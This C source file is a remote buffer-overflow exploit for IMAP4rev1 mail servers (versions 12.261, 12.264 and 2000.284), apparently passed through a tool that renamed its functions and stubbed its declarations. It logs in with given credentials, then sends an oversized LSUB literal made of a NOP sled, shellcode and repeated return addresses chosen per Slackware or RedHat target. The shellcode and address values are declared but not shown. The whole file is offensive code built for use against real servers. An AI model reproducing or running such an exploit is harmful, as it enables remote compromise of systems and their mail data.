#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct sockaddr_in {char sin_addr; int /*<<< orphan*/  sin_zero; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {char* h_addr; int h_length; } ;
typedef  int /*<<< orphan*/  sin ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  FUNC0 (char*) ; 
 char NOP ; 
 int /*<<< orphan*/  FUNC1 (int,char*) ; 
 long RET12261 ; 
 long RET12264 ; 
 long RET12264ZOOT ; 
 long RET2000_284 ; 
 int /*<<< orphan*/  SIGALRM ; 
 int SIZE ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  TIMEOUT ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 long FUNC3 (char*) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 scalar_t__ FUNC6 (int,struct sockaddr*,int) ; 
 scalar_t__ debug ; 
 int /*<<< orphan*/  errno ; 
 int /*<<< orphan*/  FUNC7 (int) ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ ,char*,...) ; 
 struct hostent* FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (int) ; 
 int /*<<< orphan*/  FUNC11 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC12 (int,int) ; 
 int /*<<< orphan*/  FUNC13 (char*) ; 
 int /*<<< orphan*/  processSignal ; 
 char* shellcode ; 
 int /*<<< orphan*/  FUNC14 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int FUNC15 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC16 (char*,char*,...) ; 
 int /*<<< orphan*/  stderr ; 
 char* FUNC17 (int /*<<< orphan*/ ) ; 
 int FUNC18 (char*) ; 
 int /*<<< orphan*/  FUNC19 (char*,char*) ; 
 int /*<<< orphan*/  FUNC20 (int,char*,int) ; 

int FUNC21(int argc, char **argv) {
	char buffer[SIZE], sockbuffer[2048];
	char *login, *password;
	long retaddr; 
	struct sockaddr_in sin;
	struct hostent *hePtr;
	int sock, i;	

	FUNC8(stderr, "\nRemote exploit for IMAP4rev1 v12.261, v12.264 and 2000.284\n"
		"Developed by SkyLaZarT - www.BufferOverflow.org\n\n");

	if ( argc < 5 ) {
		FUNC8(stderr, "%s <host> <login> <password> <type> [offset]\n", argv[0]);
		FUNC8(stderr, "\ttype: [0]\tSlackware 7.0 with IMAP4rev1 v12.261\n"
				"\ttype: [1]\tSlackware 7.1 with IMAP4rev1 v12.264\n"
				"\ttype: [2]\tRedHat 6.2 ZooT with IMAP4rev1 v12.264\n"
				"\ttype: [3]\tSlackware 7.0 with IMAP4rev1 2000.284\n\n");


		FUNC7(-1);
	}

	login = argv[2];
	password = argv[3];

	switch(FUNC3(argv[4])) {
		case 0: retaddr = RET12261; break;
		case 1: retaddr = RET12264; break;
		case 2: retaddr = RET12264ZOOT; break;
		case 3: retaddr = RET2000_284; break;
		default: 
			FUNC8(stderr, "invalid type.. assuming default " 
				"type 0\n");
			retaddr = RET12261; break;
			
	}

	if ( argc == 6 ) 
		retaddr += FUNC3(argv[5]);

	FUNC14(SIGALRM, processSignal);	

	FUNC8(stderr, "Trying to exploit %s...\n", argv[1]);

	FUNC8(stderr, "Using return address 0x%08lx. Shellcode size: %i bytes\n\n", retaddr, FUNC18(shellcode));


	FUNC2(TIMEOUT);
	hePtr = FUNC9(argv[1]);
	if (!hePtr) {
		FUNC8(stderr, "Unknow hostname : %s\n", FUNC17(errno));
		FUNC7(-1);
	}
	FUNC2(0);

	sock = FUNC15(AF_INET, SOCK_STREAM, 0);
	if ( sock < 0 ) {
		FUNC13("socket()");
		FUNC7(-1);
	}

	sin.sin_family = AF_INET;
	sin.sin_port = FUNC10(143);
	FUNC11(&sin.sin_addr, hePtr->h_addr, hePtr->h_length);
	FUNC4(&(sin.sin_zero), 8);

	FUNC8(stderr, "Connecting... "); 
	FUNC2(TIMEOUT);
	if ( FUNC6(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0 ) {
		FUNC8(stderr, "failed to %s:143\n", argv[1]);
		FUNC7(-1);
	}
	FUNC2(0);	
	
	FUNC8(stderr, "OK\n");

	
        for ( i = 0; i <= SIZE; i += 4 )
                *(long *)&buffer[i] = retaddr;

        for ( i = 0; i < ( SIZE - FUNC18(shellcode) - 100); i++ )
                *(buffer+i) = NOP;

        FUNC11(buffer + i, shellcode, FUNC18(shellcode));

	FUNC0(sockbuffer);
	FUNC1(sock, sockbuffer);

	if(debug) FUNC8(stderr, "debug %s", sockbuffer);	

	FUNC8(stderr, "Trying to loging ... ");

	FUNC16(sockbuffer, "1 LOGIN %s %s\n", login, password);
	FUNC20(sock, sockbuffer, FUNC18(sockbuffer));
	
	FUNC0(sockbuffer);
	FUNC1(sock, sockbuffer);

	if(debug) FUNC8(stderr, "debug %s", sockbuffer);
	
	if (!(FUNC19(sockbuffer, "OK LOGIN completed"))) {
		FUNC8(stderr, "Login failed!!\n");
		FUNC5(sock);
		FUNC7(-1);
	}

	FUNC8(stderr, "OK\n");
	
	FUNC0(sockbuffer);
	FUNC16(sockbuffer, "1 LSUB \"\" {1064}\r\n");
	FUNC20(sock, sockbuffer, FUNC18(sockbuffer));

        FUNC0(sockbuffer);
        FUNC1(sock, sockbuffer);

	if(debug) FUNC8(stderr, "debug %s", sockbuffer);
	
	if(!(FUNC19(sockbuffer, "Ready"))) {
		FUNC8(stderr, "LSUB command failed\n");
		FUNC5(sock);
		FUNC7(-1);
	}	

	FUNC8(stderr, "Sending shellcode... ");	
	
	FUNC20(sock, buffer, 1064);
	FUNC20(sock, "\r\n", 2);

	FUNC8(stderr, "OK\n");
	
	FUNC8(stderr, "PRESS ENTER for exploit status!!\n\n");	

	FUNC12(sock, 1);	
							
	FUNC5(sock);

	return 0;
}